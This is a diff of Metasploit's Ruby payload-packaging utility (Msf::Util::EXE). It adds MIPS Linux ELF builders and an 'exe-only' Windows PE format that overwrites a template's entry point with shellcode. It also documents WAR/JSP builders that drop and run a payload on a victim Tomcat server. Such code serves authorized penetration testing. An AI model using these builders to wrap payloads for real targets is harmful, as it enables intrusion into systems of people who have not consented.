@@ -1,21 +1,13 @@
 # -*- coding: binary -*-
-##
-# $Id: exe.rb 14286 2011-11-20 01:41:04Z rapid7 $
-##
 
-###
-#
-# framework-util-exe
-# --------------
+module Msf
+module Util
+
 #
 # The class provides methods for creating and encoding executable file
 # formats for various platforms. It is a replacement for the previous
 # code in Rex::Text
 #
-###
-
-module Msf
-module Util
 class EXE
 
 require 'rex'
@@ -127,6 +119,20 @@ require 'digest/sha1'
 				return to_osx_ppc_macho(framework, code)
 			end
 			# XXX: Add PPC OS X and Linux here
+		end
+
+		if(arch.index(ARCH_MIPSLE))
+			if(plat.index(Msf::Module::Platform::Linux))
+				return to_linux_mipsle_elf(framework, code)
+			end
+			# XXX: Add remaining MIPSLE systems here
+		end
+
+		if(arch.index(ARCH_MIPSBE))
+			if(plat.index(Msf::Module::Platform::Linux))
+				return to_linux_mipsbe_elf(framework, code)
+			end
+			# XXX: Add remaining MIPSLE systems here
 		end
 		nil
 	end
@@ -356,6 +362,41 @@ require 'digest/sha1'
 		pe.close
 
 		exe
+	end
+
+	def self.to_win32pe_only(framework, code, opts={})
+
+		# Allow the user to specify their own EXE template
+		set_template_default(opts, "template_x86_windows_old.exe")
+
+		pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
+
+		exe = ''
+			File.open(opts[:template], 'rb') { |fd|
+				exe = fd.read(fd.stat.size)
+			}
+
+		sections_header = []
+		pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+
+
+		#look for section with entry point
+		sections_header.each do |sec|
+			virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
+			sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
+			characteristics = sec[1][0x24,0x4].unpack('L')[0]
+			if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
+				#put this section writable
+				characteristics|=0x80000000
+				newcharacteristics = [characteristics].pack('L')
+				exe[sec[0],newcharacteristics.length]=newcharacteristics
+			end
+		end
+
+		#put the shellcode at the entry point, overwriting template
+		exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
+
+		return exe
 	end
 
 
@@ -609,13 +650,14 @@ require 'digest/sha1'
 	end
 
 	# Create an ELF executable containing the payload provided in +code+
+	#
 	# For the default template, this method just appends the payload, checks if
 	# the template is 32 or 64 bit and adjusts the offsets accordingly
 	# For user-provided templates, modifies the header to mark all executable
 	# segments as writable and overwrites the entrypoint (usually _start) with
 	# the payload.
 	#
-	def self.to_exe_elf(framework, opts, template, code)
+	def self.to_exe_elf(framework, opts, template, code, big_endian=false)
 
 		# Allow the user to specify their own template
 		set_template_default(opts, template)
@@ -640,11 +682,21 @@ require 'digest/sha1'
 		# Use the proper offsets and pack size
 		case elf[4]
 		when 1, "\x01" # ELFCLASS32 - 32 bit (ruby 1.8 and 1.9)
-			elf[0x44,4] = [elf.length].pack('V')  #p_filesz
-			elf[0x48,4] = [elf.length + code.length].pack('V')  #p_memsz
+			if big_endian
+				elf[0x44,4] = [elf.length].pack('N') #p_filesz
+				elf[0x48,4] = [elf.length + code.length].pack('N') #p_memsz
+			else # little endian
+				elf[0x44,4] = [elf.length].pack('V') #p_filesz
+				elf[0x48,4] = [elf.length + code.length].pack('V') #p_memsz
+			end
 		when 2, "\x02" # ELFCLASS64 - 64 bit (ruby 1.8 and 1.9)
-			elf[0x60,8] = [elf.length].pack('Q')  #p_filesz
-			elf[0x68,8] = [elf.length + code.length].pack('Q')  #p_memsz
+			if big_endian
+				elf[0x60,8] = [elf.length].pack('Q>') #p_filesz
+				elf[0x68,8] = [elf.length + code.length].pack('Q>') #p_memsz
+			else # little endian
+				elf[0x60,8] = [elf.length].pack('Q') #p_filesz
+				elf[0x68,8] = [elf.length + code.length].pack('Q') #p_memsz
+			end
 		else
 			raise RuntimeError, "Invalid ELF template: EI_CLASS value not supported"
 		end
@@ -714,6 +766,16 @@ require 'digest/sha1'
 
 	def self.to_linux_armle_elf(framework, code, opts={})
 		elf = to_exe_elf(framework, opts, "template_armle_linux.bin", code)
+		return elf
+	end
+
+	def self.to_linux_mipsle_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_mipsle_linux.bin", code)
+		return elf
+	end
+
+	def self.to_linux_mipsbe_elf(framework, code, opts={})
+		elf = to_exe_elf(framework, opts, "template_mipsbe_linux.bin", code, true)
 		return elf
 	end
 
@@ -1187,8 +1249,9 @@ End Sub
 	# Creates a jar file that drops the provided +exe+ into a random file name
 	# in the system's temp dir and executes it.
 	#
-	# See also: +Msf::Core::Payload::Java+
+	# @see Msf::Payload::Java
 	#
+	# @return [Rex::Zip::Jar]
 	def self.to_jar(exe, opts={})
 		spawn = opts[:spawn] || 2
 		exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
@@ -1205,8 +1268,30 @@ End Sub
 		zip
 	end
 
-	# Creates a Web Archive (WAR) file from the provided jsp code. Additional options
-	# can be provided via  the "opts" hash.
+	# Creates a Web Archive (WAR) file from the provided jsp code.
+	#
+	# On Tomcat, WAR files will be deployed into a directory with the same name
+	# as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
+	# server is in a default configuration, deoployment will happen
+	# automatically. See
+	# {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
+	# documentation} for a description of how this works.
+	#
+	# @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
+	#   in the archive. This will be compiled by the victim servlet container
+	#   (e.g., Tomcat) and act as the main function for the servlet.
+	# @param opts [Hash]
+	# @option opts :jsp_name [String] Name of the <jsp-file> in the archive
+	#   _without the .jsp extension_. Defaults to random.
+	# @option opts :app_name [String] Name of the app to put in the <servlet-name>
+	#   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
+	#   random.
+	# @option opts :extra_files [Array<String,String>] Additional files to add
+	#   to the archive. First elment is filename, second is data
+	#
+	# @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
+	#
+	# @return [String]
 	def self.to_war(jsp_raw, opts={})
 		jsp_name = opts[:jsp_name]
 		jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
@@ -1247,9 +1332,15 @@ End Sub
 		return zip.pack
 	end
 
-	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a payload.
-	# The jsp page converts the hexdump back to a normal .exe file and places it in
-	# the temp directory. The payload .exe file is then executed.
+	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
+	# payload.  The jsp page converts the hexdump back to a normal binary file
+	# and places it in the temp directory. The payload file is then executed.
+	#
+	# @see to_war
+	# @param exe [String] Executable to drop and run.
+	# @param opts (see to_war)
+	# @option opts (see to_war)
+	# @return (see to_war)
 	def self.to_jsp_war(exe, opts={})
 
 		# begin <payload>.jsp
@@ -1874,6 +1965,11 @@ End Sub
 				output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
 			end
 
+		when 'exe-only'
+			if(not arch or (arch.index(ARCH_X86)))
+				output = Msf::Util::EXE.to_win32pe_only(framework, code, exeopts)
+			end
+
 		when 'elf'
 			if (not plat or (plat.index(Msf::Module::Platform::Linux)))
 				if (not arch or (arch.index(ARCH_X86)))
@@ -1938,7 +2034,7 @@ End Sub
 	end
 
 	def self.to_executable_fmt_formats
-		['dll','exe','exe-small','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
+		['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
 	end
 
 	#
